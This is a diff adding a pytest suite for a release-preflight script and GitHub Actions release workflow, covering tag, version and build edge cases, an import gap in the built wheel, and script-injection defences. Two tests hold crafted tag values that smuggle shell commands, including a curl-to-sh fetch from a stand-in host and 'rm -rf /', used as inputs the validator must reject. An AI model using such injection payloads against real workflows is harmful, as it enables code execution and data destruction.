@@ -1,0 +1,656 @@
+"""Story 9.2 / AC5 — the release edge cases are an ENUMERATED SPACE with a live handler each.
+
+Verification area ArgusAgent-RELEASE (``TC-ArgusAgent-RELEASE-001-NN``) — a NEW area; no
+``RELEASE`` tests existed before this story, because before this story there was no
+release path at all (measured: ``.github/workflows/`` held exactly ``audit-ci.yml`` and
+``argus-student-audit.yml``, neither of which builds, tags or publishes; ``git tag -l``
+was empty).
+
+**Why this file is shaped the way it is (AI-E8-6).** The Epic-8 retrospective found that
+all five of its stories shipped a guard NARROWER than its own acceptance criterion — a
+sample where the AC said "every". AC5 says the enumeration must live in one named place
+and that a committed test must assert *every member is handled* and *fail when a member is
+added without a handler*. So:
+
+* ``-01`` asserts the enumeration and the handler registry are the SAME SET. Adding
+  ``E7`` to ``RELEASE_EDGE_CASE_IDS`` without writing ``check_e7_*`` fails here.
+* ``-02`` asserts every member is assigned to a workflow PHASE, so a case cannot be
+  handled in code yet never actually run.
+* ``-03``..``-08`` give each member BOTH a refusing case and a non-refusing case. A check
+  that returns a refusal unconditionally would pass a refusal-only test; a check that
+  never refuses would pass a clearance-only test. Neither passes both.
+* ``-09`` asserts the committed workflow really invokes the preflight for both phases —
+  an enumeration nothing runs is documentation, not a guard.
+* ``-10`` asserts the workflow makes no published-release claim and references no secret.
+
+No network, no LLM, no ``.argus/`` write, no new dependency: the checks are pure functions
+over an injected context, which is the reason the context is injected at all.
+"""
+
+from __future__ import annotations
+
+import sys
+from pathlib import Path
+
+import pytest
+
+_REPO_ROOT = Path(__file__).resolve().parents[1]
+sys.path.insert(0, str(_REPO_ROOT / "scripts"))
+
+import release_preflight as rp  # noqa: E402
+
+_WORKFLOW = _REPO_ROOT / ".github" / "workflows" / "release.yml"
+
+
+def _ctx(**overrides: object) -> rp.PreflightContext:
+    """A context that clears EVERY check, so any single override isolates one case."""
+    base = dict(
+        repo_root=_REPO_ROOT,
+        tag="v0.1.0",
+        pyproject_version="0.1.0",
+        dirty_paths=(),
+        existing_tags=("v0.1.0",),
+        head_sha="a" * 40,
+        tag_sha="a" * 40,
+        published_release_tags=(),
+        dist_files=("argus_agent-0.1.0-py3-none-any.whl", "argus_agent-0.1.0.tar.gz"),
+        creating_tag=False,
+    )
+    base.update(overrides)
+    return rp.PreflightContext(**base)  # type: ignore[arg-type]
+
+
+def test_TC_ArgusAgent_RELEASE_001_01_every_enumerated_case_has_a_handler() -> None:
+    """TC-ArgusAgent-RELEASE-001-01 — AC5: the enumeration and the handler registry are one set."""
+    enumerated = set(rp.RELEASE_EDGE_CASE_IDS)
+    handled = {case for case in enumerated if rp.handler_for(case) is not None}
+    described = set(rp.EDGE_CASE_DESCRIPTIONS)
+
+    assert enumerated == {"E1", "E2", "E3", "E4", "E5", "E6"}, (
+        "boundary B10 enumerates exactly six release edge cases"
+    )
+    assert enumerated == handled == described, (
+        "every enumerated release edge case must have BOTH a handler and a description; "
+        f"enumerated={sorted(enumerated)} handled={sorted(handled)} described={sorted(described)}"
+    )
+    # Fail-on-unenumerated, demonstrated rather than asserted: a member added to the
+    # enumeration without a handler raises immediately.
+    with pytest.raises(KeyError):
+        rp.handler_for("E7")
+
+
+def test_TC_ArgusAgent_RELEASE_001_02_every_case_is_assigned_to_a_phase() -> None:
+    """TC-ArgusAgent-RELEASE-001-02 — AC5: a handled case that never runs is not handled.
+
+    Every member must belong to exactly one workflow phase. Without this, a case could be
+    implemented, registered, described — and never evaluated by any step of the release.
+    """
+    assigned = list(rp._PRE_BUILD) + list(rp._POST_BUILD)
+    assert sorted(assigned) == sorted(rp.RELEASE_EDGE_CASE_IDS)
+    assert len(assigned) == len(set(assigned)), "a case is assigned to two phases"
+    # `--phase all` really runs all six.
+    assert len(rp.run_preflight(_ctx(dirty_paths=("x",), dist_files=()), phase="all")) == 2
+
+
+def test_TC_ArgusAgent_RELEASE_001_03_e1_refuses_a_dirty_tree_and_clears_a_clean_one() -> None:
+    """TC-ArgusAgent-RELEASE-001-03 — AC5/E1: a dirty tree is refused; a clean one is not."""
+    assert rp.check_e1_dirty_worktree(_ctx()) is None
+    refusal = rp.check_e1_dirty_worktree(_ctx(dirty_paths=("argus/pipeline.py",)))
+    assert refusal is not None and refusal.edge_case == "E1"
+    assert "argus/pipeline.py" in refusal.reason
+
+
+def test_TC_ArgusAgent_RELEASE_001_04_e2_refuses_recreating_an_existing_tag() -> None:
+    """TC-ArgusAgent-RELEASE-001-04 — AC5/E2: creating an existing tag is refused, no overwrite.
+
+    And, just as important, it does NOT fire on the tag-PUSH path: there the tag exists
+    because that is why the run started, so a naive "the tag exists" check would refuse
+    every legitimate release.
+    """
+    assert rp.check_e2_tag_already_exists(_ctx(creating_tag=False)) is None
+    refusal = rp.check_e2_tag_already_exists(_ctx(creating_tag=True))
+    assert refusal is not None and refusal.edge_case == "E2"
+    assert rp.check_e2_tag_already_exists(
+        _ctx(creating_tag=True, tag="v0.2.0", existing_tags=("v0.1.0",))
+    ) is None
+
+
+def test_TC_ArgusAgent_RELEASE_001_05_e3_refuses_a_moved_tag() -> None:
+    """TC-ArgusAgent-RELEASE-001-05 — AC5/E3: a tag that no longer points at the build is refused."""
+    assert rp.check_e3_tag_moved(_ctx()) is None
+    refusal = rp.check_e3_tag_moved(_ctx(tag_sha="b" * 40))
+    assert refusal is not None and refusal.edge_case == "E3"
+    assert "b" * 12 in refusal.reason and "a" * 12 in refusal.reason
+
+
+def test_TC_ArgusAgent_RELEASE_001_06_e4_refuses_overwriting_a_published_release() -> None:
+    """TC-ArgusAgent-RELEASE-001-06 — AC5/E4: an already-published version is refused."""
+    assert rp.check_e4_release_already_published(_ctx()) is None
+    refusal = rp.check_e4_release_already_published(
+        _ctx(published_release_tags=("v0.0.9", "v0.1.0"))
+    )
+    assert refusal is not None and refusal.edge_case == "E4"
+
+
+def test_TC_ArgusAgent_RELEASE_001_07_e5_refuses_a_tag_version_mismatch() -> None:
+    """TC-ArgusAgent-RELEASE-001-07 — AC5/E5: the tag and the packaged version must agree.
+
+    Also covers the non-version tag, which is neither a match nor a mismatch and would
+    otherwise fall through a naive equality check into a silent pass.
+    """
+    assert rp.check_e5_tag_version_mismatch(_ctx()) is None
+    mismatch = rp.check_e5_tag_version_mismatch(_ctx(tag="v0.2.0"))
+    assert mismatch is not None and mismatch.edge_case == "E5"
+    assert "0.2.0" in mismatch.reason and "0.1.0" in mismatch.reason
+    junk = rp.check_e5_tag_version_mismatch(_ctx(tag="release-candidate"))
+    assert junk is not None and junk.edge_case == "E5"
+    assert rp.normalize_tag("v1.2.3") == "1.2.3"
+    assert rp.normalize_tag("1.2.3") is None
+
+
+def test_TC_ArgusAgent_RELEASE_001_08_e6_refuses_a_partial_or_empty_build() -> None:
+    """TC-ArgusAgent-RELEASE-001-08 — AC5/E6: both artifacts, or none. Never half a release."""
+    assert rp.check_e6_incomplete_build(_ctx()) is None
+    empty = rp.check_e6_incomplete_build(_ctx(dist_files=()))
+    assert empty is not None and empty.edge_case == "E6"
+    wheel_only = rp.check_e6_incomplete_build(
+        _ctx(dist_files=("argus_agent-0.1.0-py3-none-any.whl",))
+    )
+    assert wheel_only is not None and wheel_only.edge_case == "E6"
+    sdist_only = rp.check_e6_incomplete_build(_ctx(dist_files=("argus_agent-0.1.0.tar.gz",)))
+    assert sdist_only is not None and sdist_only.edge_case == "E6"
+
+
+def test_TC_ArgusAgent_RELEASE_001_09_the_workflow_actually_runs_the_preflight() -> None:
+    """TC-ArgusAgent-RELEASE-001-09 — AC2/AC5: an enumeration nothing runs is documentation.
+
+    The committed workflow must invoke BOTH phases, build both artifacts, declare its
+    trigger and its permissions, and reference the preflight by its real path.
+    """
+    assert _WORKFLOW.is_file(), "the release workflow must be committed"
+    text = _WORKFLOW.read_text(encoding="utf-8")
+    assert "scripts/release_preflight.py" in text
+    assert "--phase pre-build" in text and "--phase post-build" in text
+    assert "python -m build" in text
+    assert "permissions:" in text and "contents: write" in text
+    assert "tags:" in text and "workflow_dispatch:" in text
+    # The preflight script it names really exists at that path.
+    assert (_REPO_ROOT / "scripts" / "release_preflight.py").is_file()
+
+
+def test_TC_ArgusAgent_RELEASE_001_10_the_workflow_claims_no_publication_and_no_secret() -> None:
+    """TC-ArgusAgent-RELEASE-001-10 — AC2/AC3/AC12: bounded claims, no undeclared credential.
+
+    Two separate honesty properties of the release surface, pinned together because they
+    fail together. (a) The workflow must not depend on a secret that AC3's access record
+    does not name — it uses only the automatic ``github.token``, so ``secrets.`` must not
+    appear at all. (b) It must not present the self-audit as assurance: no release surface
+    may claim external validation or a cleared precision gate (SD-2).
+    """
+    text = _WORKFLOW.read_text(encoding="utf-8")
+    assert "secrets." not in text, (
+        "the release workflow references a repository secret; AC3 requires every "
+        "credential a consumer or the workflow needs to be recorded, and D2 chose the "
+        "GitHub-Release path precisely because it needs none"
+    )
+    lowered = text.lower()
+    # (a2) And it carries no index-publishing STEP. D2 locked PyPI out of this story
+    # because publishing a name+version is irreversible; the file may explain that in
+    # prose, but it must not contain the action or the command that does it.
+    for publisher in ("gh-action-pypi-publish", "twine upload", "flit publish"):
+        assert publisher not in lowered, (
+            f"the release workflow contains an index-publishing step ({publisher!r}); "
+            "D2 locked PyPI out of this story as an irreversible operator decision"
+        )
+    for overclaim in (
+        "externally validated",
+        "independently validated",
+        "externalization-grade",
+        "gate cleared",
+        "precision gate is cleared",
+        "assurance evidence",
+    ):
+        assert overclaim not in lowered, f"the release workflow over-claims: {overclaim!r}"
+    # And it states its own unproven status rather than implying a publication happened.
+    assert "has never executed" in lowered
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Story 9.2 / AC4 + AC5b — what the BUILT distribution can actually do.
+#
+# AC4 required the artifact to be PROVEN, not merely built, and the proof surfaced a
+# defect no source-tree test could see. MEASURED on the built wheel
+# (`argus_agent-0.1.0-py3-none-any.whl`, 76 entries = 71 `argus/**` modules + 5
+# `dist-info`), with the wheel's contents on `sys.path`, this repository REMOVED from
+# `sys.path`, and one clean subprocess per module (re-measured 2026-08-09):
+#
+#   66 of the 71 shipped modules import.
+#   5 do NOT, all with `ModuleNotFoundError: No module named '_registry'`:
+#     argus/precision/__init__.py, argus/precision/replay_harness.py,
+#     argus/dogfood/proof_types.py, argus/dogfood/proof_render.py,
+#     argus/dogfood/proof_run.py
+#
+# (An earlier revision of this block said "65 of the 69 ... 4 do NOT". 69 was the PRE-split
+# module count and the four-module list silently dropped `replay_harness.py`, which is the
+# module that causes the failure. Both were corrected against a fresh measurement rather
+# than re-derived from the previous sentence.)
+#
+# The cause is one line: `argus/precision/replay_harness.py` unconditionally imports
+# `_registry` from `tests/cartridges/`, a directory the distribution does not contain (and
+# should not — it is the labelled ground-truth store for the precision harness). Every
+# other failure is that one import, reached transitively.
+#
+# PRE-EXISTING, verified rather than assumed: the identical import exists at HEAD 7be90f7
+# (`git show 7be90f7:argus/precision/replay_harness.py`), and `proof_run.py` imported
+# `argus.precision.replay_harness` there too. The Story-9.2 split did not create it and
+# did not widen the CONSUMER surface: the two new modules (`proof_types`, `proof_render`)
+# fail only because they re-export what already failed, and `proof_run.py` failed before
+# the split for the same reason. Nothing that imported before imports less now.
+#
+# NOT FIXED HERE, deliberately: `argus/precision/**` is FENCED by Story 9.2 / AC15, and
+# the fix (a lazy or optional registry import) is a behavioural change to the precision
+# substrate in a release story that has no mandate over it. Filed as `DF-9-2-A` in
+# deferred-work.md with this measurement attached.
+#
+# WHY THE RELEASE STILL STANDS: IN-1/IN-3 need `argus audit` — the CLI, the pipeline, the
+# detectors, the verdict gate, the reports. All of that imports and RUNS from the wheel
+# (proven: `argus --help` exit 0; `argus audit <fixture>` -> RELEASE_READY, exit 0, from a
+# working directory that is not this repository). What a consumer cannot do from the
+# distribution alone is re-run Argus's own dogfood proof generator, which is a
+# self-audit-of-Argus tool, not a consumer feature. README.md states this split.
+#
+# The guard below pins the boundary in BOTH directions.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Modules that are KNOWN to be unimportable from the built distribution, each because of
+# the single `_registry` import above. Pinned exactly: the test fails if the set GROWS (a
+# new module joined the broken surface) and if it SHRINKS (someone fixed DF-9-2-A and must
+# now update this record rather than leave a stale claim behind).
+_NOT_IMPORTABLE_FROM_DISTRIBUTION: frozenset[str] = frozenset(
+    {
+        "argus/precision/__init__.py",
+        "argus/precision/replay_harness.py",
+        "argus/dogfood/proof_types.py",
+        "argus/dogfood/proof_render.py",
+        "argus/dogfood/proof_run.py",
+    }
+)
+
+# The import that does it, and the tree it points into.
+_TEST_TREE_IMPORT = "_registry"
+
+# The consumer-facing surface IN-1 / IN-3 depend on. Every one of these was executed from
+# the installed wheel during Story 9.2's AC4 proof.
+_CONSUMER_SURFACE = (
+    "argus/__init__.py",
+    "argus/cli.py",
+    "argus/pipeline.py",
+    "argus/models.py",
+    "argus/verdict/verdict_gate.py",
+    "argus/reports/generator.py",
+)
+
+
+def _modules_reaching(target: str) -> set[str]:
+    """Every ``argus/**`` module that imports *target*, directly or transitively."""
+    import ast
+
+    package_root = _REPO_ROOT / "argus"
+    edges: dict[str, set[str]] = {}
+    direct: set[str] = set()
+    for path in sorted(package_root.rglob("*.py")):
+        if "__pycache__" in path.parts:
+            continue
+        rel = path.relative_to(_REPO_ROOT).as_posix()
+        edges[rel] = set()
+        tree = ast.parse(path.read_text(encoding="utf-8"))
+        for node in ast.walk(tree):
+            names: list[str] = []
+            if isinstance(node, ast.Import):
+                names = [a.name for a in node.names]
+            elif isinstance(node, ast.ImportFrom) and node.module:
+                names = [node.module]
+            for name in names:
+                if name == target:
+                    direct.add(rel)
+                elif name.startswith("argus."):
+                    parts = name.split(".")
+                    module_path = "/".join(parts) + ".py"
+                    package_path = "/".join(parts) + "/__init__.py"
+                    edges[rel].add(module_path)
+                    edges[rel].add(package_path)
+    reaching = set(direct)
+    changed = True
+    while changed:
+        changed = False
+        for source, targets in edges.items():
+            if source in reaching:
+                continue
+            if targets & reaching:
+                reaching.add(source)
+                changed = True
+    return reaching
+
+
+def test_TC_ArgusAgent_RELEASE_001_11_distribution_gap_is_pinned_exactly() -> None:
+    """TC-ArgusAgent-RELEASE-001-11 — AC4/AC5b: the un-shippable surface is measured, not guessed.
+
+    The distribution packages the ``argus`` module only. Any ``argus/**`` module that
+    reaches ``tests/cartridges/_registry`` cannot be imported by a consumer who installed
+    the wheel, no matter how green the source-tree suite is — the suite runs with
+    ``tests/`` on the path and is structurally blind to it. This computes the reachable
+    set from the import graph and pins it against the set MEASURED inside a fresh
+    virtualenv during Story 9.2's AC4 proof.
+    """
+    reaching = _modules_reaching(_TEST_TREE_IMPORT)
+    assert reaching, "the import-graph walk found nothing — the walk itself is broken"
+    assert reaching == set(_NOT_IMPORTABLE_FROM_DISTRIBUTION), (
+        "the set of argus/** modules that cannot be imported from the built "
+        "distribution changed. If it GREW, a new module was made unshippable; if it "
+        "SHRANK, DF-9-2-A was fixed and this record and README.md must be updated to "
+        f"match. expected {sorted(_NOT_IMPORTABLE_FROM_DISTRIBUTION)}, "
+        f"measured {sorted(reaching)}"
+    )
+
+
+def test_TC_ArgusAgent_RELEASE_001_12_consumer_surface_is_shippable() -> None:
+    """TC-ArgusAgent-RELEASE-001-12 — AC4/IN-1/IN-3: the surface consumers need is clean.
+
+    This is the half that must never regress. ``argus audit`` is the entire integration
+    contract for the downstream repository (IN-1 dependency, IN-3 CI gate). If any module
+    on that path ever starts reaching into ``tests/``, the wheel stops being installable
+    for its actual purpose — and this fails before the release, not after.
+    """
+    reaching = _modules_reaching(_TEST_TREE_IMPORT)
+    broken = [module for module in _CONSUMER_SURFACE if module in reaching]
+    assert not broken, (
+        f"the consumer-facing surface reaches the test tree and cannot ship: {broken}"
+    )
+    for module in _CONSUMER_SURFACE:
+        assert (_REPO_ROOT / module).is_file(), f"{module} is not on disk"
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Story 9.2 / code-review iteration 1 — a guard that cannot observe is not a guard,
+# and untrusted input must never reach shell source.
+#
+# Three defects were found in the shipped release surface and are pinned here so they
+# cannot come back:
+#
+#  * E4 could never fire in CI (the preflight step had no GH_TOKEN, `gh release list`
+#    failed on authentication, and the failure was swallowed into "no releases known"),
+#    while the report printed `ok` for it into the workflow log — a PUBLICATION surface
+#    asserting a clearance it was structurally unable to evaluate. `-13`..`-16`.
+#  * `workflow_dispatch.inputs.tag` was interpolated into `run:` script bodies on a job
+#    holding `contents: write`, which is GitHub's documented script-injection
+#    anti-pattern. `-17`.
+#  * E2 was registered, handled and phase-assigned but unreachable from the committed
+#    workflow, so the enumeration read as more active than it is. `-18`.
+# ─────────────────────────────────────────────────────────────────────────────
+
+
+def _run_block_bodies(text: str) -> list[str]:
+    """Every ``run:`` script body in a workflow, as the shell would receive it.
+
+    Deliberately textual and dependency-free (this file must not add a YAML dependency to
+    the suite): a ``run:`` value is either inline or a block scalar whose body is the
+    following more-indented lines.
+    """
+    lines = text.splitlines()
+    bodies: list[str] = []
+    index = 0
+    while index < len(lines):
+        line = lines[index]
+        stripped = line.strip()
+        if not stripped.startswith("run:"):
+            index += 1
+            continue
+        indent = len(line) - len(line.lstrip())
+        rest = stripped[len("run:"):].strip()
+        index += 1
+        if rest and rest not in ("|", ">", "|-", ">-", "|+", ">+"):
+            bodies.append(rest)
+            continue
+        body: list[str] = []
+        while index < len(lines):
+            candidate = lines[index]
+            if candidate.strip() and (len(candidate) - len(candidate.lstrip())) <= indent:
+                break
+            body.append(candidate)
+            index += 1
+        bodies.append("\n".join(body))
+    return bodies
+
+
+def test_TC_ArgusAgent_RELEASE_001_13_e4_separates_no_releases_from_could_not_ask() -> None:
+    """TC-ArgusAgent-RELEASE-001-13 — AC5/E4: "could not ask" is not "asked, none exist".
+
+    The pre-fix shape collapsed both into an empty tuple, so an unauthenticated runner
+    produced an E4 clearance byte-identical to a real one. The distinction now lives in the
+    type: ``None`` means the question could not be put, and the answer is
+    :class:`Unevaluable` — which is neither a refusal nor a clearance.
+    """
+    assert rp.check_e4_release_already_published(_ctx(published_release_tags=())) is None
+
+    unknown = rp.check_e4_release_already_published(_ctx(published_release_tags=None))
+    assert isinstance(unknown, rp.Unevaluable), (
+        "E4 cleared a run in which it could not observe the published-release list"
+    )
+    assert unknown.edge_case == "E4"
+    assert "could not be obtained" in unknown.reason
+
+    # An unevaluated case is NOT reported as a refusal: the release is not blocked by the
+    # absence of `gh`, it is merely not cleared on that point.
+    refusals = rp.run_preflight(_ctx(published_release_tags=None), phase="pre-build")
+    assert refusals == [], "an unevaluable check must not masquerade as a refusal"
+
+    # ...and it is still visible in the full-fidelity result.
+    outcomes = dict(rp.run_checks(_ctx(published_release_tags=None), phase="pre-build"))
+    assert isinstance(outcomes["E4"], rp.Unevaluable)
+    assert outcomes["E1"] is None and outcomes["E5"] is None
+
+
+def test_TC_ArgusAgent_RELEASE_001_14_the_report_never_prints_ok_for_an_unevaluated_case(
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """TC-ArgusAgent-RELEASE-001-14 — AC2/AC5: the printed report is a publication surface.
+
+    The workflow log is read by humans and is where the false clearance actually appeared.
+    This drives ``main()`` end-to-end over a context whose release list could not be
+    obtained and asserts the line for E4 says ``UNKNOWN``, that the run does not claim
+    everything was cleared, and that it says in words that this is not a clearance.
+    """
+    monkeypatch.setattr(
+        rp, "gather_context", lambda *a, **k: _ctx(published_release_tags=None)
+    )
+    exit_code = rp.main(["--tag", "v0.1.0", "--phase", "pre-build"])
+    out = capsys.readouterr().out
+    e4_line = next(line for line in out.splitlines() if line.strip().startswith("E4 "))
+
+    assert "UNKNOWN" in e4_line, f"E4 was reported as something other than UNKNOWN: {e4_line!r}"
+    assert not e4_line.rstrip().endswith("ok"), (
+        "the report printed `ok` for a check that could not observe what it needs"
+    )
+    assert "all enumerated release edge cases cleared" not in out, (
+        "the run claimed a full clearance while E4 was never evaluated"
+    )
+    assert "not a clearance" in out
+    assert exit_code == 0, (
+        "an unevaluable E4 must not block the release: `gh` is legitimately absent "
+        "locally and `gh release create --verify-tag` still refuses to clobber"
+    )
+
+    # Control: when the list IS obtainable and empty, E4 clears and says so.
+    monkeypatch.setattr(rp, "gather_context", lambda *a, **k: _ctx(published_release_tags=()))
+    assert rp.main(["--tag", "v0.1.0", "--phase", "pre-build"]) == 0
+    cleared = capsys.readouterr().out
+    assert "all enumerated release edge cases cleared" in cleared
+    assert "UNKNOWN" not in cleared
+
+
+def test_TC_ArgusAgent_RELEASE_001_15_the_release_list_collector_reports_could_not_ask(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """TC-ArgusAgent-RELEASE-001-15 — AC5/E4: the collector itself distinguishes the two.
+
+    ``-13`` pins the check; this pins the impure half that feeds it, because the swallow
+    happened there. All three failure modes — ``gh`` absent, ``gh`` exiting non-zero
+    (which is what an unauthenticated runner does), and unparseable output — must report
+    "could not ask", while a genuine empty list must report "asked, none".
+    """
+    import subprocess as _subprocess
+
+    class _Proc:
+        def __init__(self, returncode: int, stdout: str) -> None:
+            self.returncode = returncode
+            self.stdout = stdout
+
+    def _absent(*_a: object, **_k: object) -> object:
+        raise FileNotFoundError("gh")
+
+    monkeypatch.setattr(_subprocess, "run", _absent)
+    assert rp._published_release_tags(_REPO_ROOT) is None, "missing `gh` reported as 'none'"
+
+    monkeypatch.setattr(_subprocess, "run", lambda *a, **k: _Proc(1, ""))
+    assert rp._published_release_tags(_REPO_ROOT) is None, (
+        "an unauthenticated `gh release list` was reported as 'no releases exist'"
+    )
+
+    monkeypatch.setattr(_subprocess, "run", lambda *a, **k: _Proc(0, "not json"))
+    assert rp._published_release_tags(_REPO_ROOT) is None
+
+    monkeypatch.setattr(_subprocess, "run", lambda *a, **k: _Proc(0, "[]"))
+    assert rp._published_release_tags(_REPO_ROOT) == (), (
+        "a genuine empty release list must be 'asked, none exist', not 'could not ask'"
+    )
+
+    monkeypatch.setattr(
+        _subprocess, "run", lambda *a, **k: _Proc(0, '[{"tagName": "v0.0.9"}]')
+    )
+    assert rp._published_release_tags(_REPO_ROOT) == ("v0.0.9",)
+
+
+def test_TC_ArgusAgent_RELEASE_001_16_the_workflow_gives_e4_what_it_needs_to_observe() -> None:
+    """TC-ArgusAgent-RELEASE-001-16 — AC5: the pre-build preflight step can actually reach the API.
+
+    The defect was structural, not logical: the step that runs E1-E5 had no ``GH_TOKEN``,
+    only the final publish step did, so E4 could never fire no matter how correct the
+    check was. This asserts the token reaches the step that needs it, and that it is the
+    automatic ``github.token`` rather than a stored secret AC3 does not record.
+    """
+    text = _WORKFLOW.read_text(encoding="utf-8")
+    step_start = text.index("--phase pre-build")
+    # The env block for a step precedes its `run:`; take the step's slice back to its name.
+    step_slice = text[text.rindex("- name:", 0, step_start): step_start]
+    assert "GH_TOKEN: ${{ github.token }}" in step_slice, (
+        "the pre-build preflight step has no GH_TOKEN, so `gh release list` fails on "
+        "authentication and E4 can never fire in CI"
+    )
+    assert "secrets." not in text, "the release workflow must need no stored secret (AC3)"
+
+
+def test_TC_ArgusAgent_RELEASE_001_17_untrusted_input_never_reaches_shell_source() -> None:
+    """TC-ArgusAgent-RELEASE-001-17 — AC2/security: no script injection on a contents:write job.
+
+    A ``${{ }}`` expression is expanded by the runner INTO the shell source text before
+    bash parses it. ``workflow_dispatch.inputs.tag`` is free-form — the ``v[0-9]+...``
+    filter constrains only the tag-PUSH trigger — so a crafted dispatch value interpolated
+    into a ``run:`` body executes arbitrary commands in a job holding ``contents: write``
+    and ``github.token``. Three properties, all necessary:
+
+    1. NO ``run:`` body contains a ``${{ }}`` expression at all (values arrive via ``env:``
+       and are referenced as quoted shell variables).
+    2. The tag is bound through ``env:`` on every step that uses it.
+    3. The value is validated against the single ``^v\\d+\\.\\d+\\.\\d+$`` pattern BEFORE
+       any other command sees it.
+    """
+    text = _WORKFLOW.read_text(encoding="utf-8")
+    bodies = _run_block_bodies(text)
+    assert bodies, "the run-block extractor found nothing — the extractor itself is broken"
+
+    interpolating = [body for body in bodies if "${{" in body]
+    assert not interpolating, (
+        "a `run:` body interpolates a `${{ }}` expression directly into shell source, "
+        f"which is the script-injection anti-pattern: {interpolating}"
+    )
+
+    assert "TAG: ${{ inputs.tag || github.ref_name }}" in text, (
+        "the untrusted dispatch input must be bound through `env:`, not interpolated"
+    )
+    assert text.count("TAG: ${{ steps.resolve.outputs.tag }}") >= 3, (
+        "every later step that uses the tag must bind it through `env:` too"
+    )
+
+    validate_at = text.index("--phase validate-tag")
+    for later in ("--phase pre-build", "--phase post-build", "gh release create"):
+        assert validate_at < text.index(later), (
+            f"the tag validation must run before {later!r}; a validator that runs after "
+            "the value has already reached a command protects nothing"
+        )
+    # And the validator really refuses a crafted value, before touching git or `gh`.
+    assert rp.normalize_tag('v0.1.0"; curl evil.example | sh #') is None
+    assert rp.normalize_tag("v0.1.0") == "0.1.0"
+
+
+def test_TC_ArgusAgent_RELEASE_001_18_e2_unreachability_is_disclosed_and_pinned() -> None:
+    """TC-ArgusAgent-RELEASE-001-18 — AC5: the enumeration does not read as more active than it is.
+
+    ``-02`` asserts every member is assigned to a phase. That is necessary and NOT
+    sufficient: E2 only fires when the run is CREATING the tag, and neither committed
+    trigger does, so no CI path reaches it. Rather than pass ``--creating-tag`` on the
+    dispatch path — which would be a false statement about what that run is doing, and
+    would refuse every legitimate dispatch — the gap is DISCLOSED in ``CI_UNREACHABLE``,
+    printed next to E2 in the report, and pinned here in both directions: the disclosure
+    may not name a member that is reachable, and the workflow may not become reachable
+    while the disclosure still says it is not.
+    """
+    assert set(rp.CI_UNREACHABLE) <= set(rp.RELEASE_EDGE_CASE_IDS)
+    assert set(rp.CI_UNREACHABLE) == {"E2"}, (
+        "the CI-reachability disclosure changed; re-derive it against the workflow"
+    )
+
+    text = _WORKFLOW.read_text(encoding="utf-8")
+    assert "--creating-tag" not in text, (
+        "the workflow now passes --creating-tag, so E2 IS reachable — remove it from "
+        "CI_UNREACHABLE (and from the workflow header comment) rather than leaving a "
+        "stale disclosure behind"
+    )
+    # The cause is real: with creating_tag False, E2 cannot fire whatever the tag list says.
+    assert rp.check_e2_tag_already_exists(
+        _ctx(creating_tag=False, existing_tags=("v0.1.0",))
+    ) is None
+    assert rp.check_e2_tag_already_exists(
+        _ctx(creating_tag=True, existing_tags=("v0.1.0",))
+    ) is not None
+    # The workflow header states it in prose too, so a reader of the file is not left to
+    # infer it from a Python constant.
+    assert "E2 is not reachable from this workflow" in text
+
+
+def test_TC_ArgusAgent_RELEASE_001_19_a_bad_tag_is_refused_before_anything_else_runs(
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """TC-ArgusAgent-RELEASE-001-19 — AC2/security: validation happens before collection.
+
+    ``--phase validate-tag`` must reject a malformed tag WITHOUT gathering context — no
+    git subprocess, no ``gh`` call, nothing that could act on the crafted value. The
+    guard is proven by making ``gather_context`` explode: if it is reached, this fails.
+    """
+    def _must_not_run(*_a: object, **_k: object) -> rp.PreflightContext:
+        raise AssertionError("gather_context ran before the tag was validated")
+
+    monkeypatch.setattr(rp, "gather_context", _must_not_run)
+
+    assert rp.main(["--tag", "v0.1.0", "--phase", "validate-tag"]) == 0
+    assert "expected v<major>.<minor>.<patch> shape" in capsys.readouterr().out
+
+    for crafted in ('v0.1.0"; rm -rf / #', "$(id)", "v0.1", "main", "v0.1.0\nmalicious=1"):
+        assert rp.main(["--tag", crafted, "--phase", "validate-tag"]) == 1, (
+            f"a malformed tag was accepted: {crafted!r}"
+        )
+        assert "RELEASE REFUSED" in capsys.readouterr().out
+
+    # And the refusal is enforced on the real phases too, not only in validate-tag mode.
+    assert rp.main(["--tag", "not-a-tag", "--phase", "pre-build"]) == 1
